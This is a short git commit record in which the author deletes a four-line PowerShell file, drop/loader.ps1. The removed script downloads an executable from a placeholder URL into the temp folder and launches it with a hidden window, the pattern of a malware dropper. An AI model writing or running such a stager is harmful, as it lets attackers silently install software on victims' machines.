1a4f727e47dae61c1ffce81a508cfbf59b243f58
surhan <surhan1@proton.me>
2025-03-25 19:12:53 +0000

    Delete drop/loader.ps1

--- drop/loader.ps1
+++
@@ -1,4 +0,0 @@
-$tempPath = [System.IO.Path]::GetTempPath()
-$exePath = Join-Path $tempPath "deploy.exe"
-Invoke-WebRequest -Uri "link here" -OutFile $exePath
-Start-Process -FilePath $exePath -WindowStyle Hidden
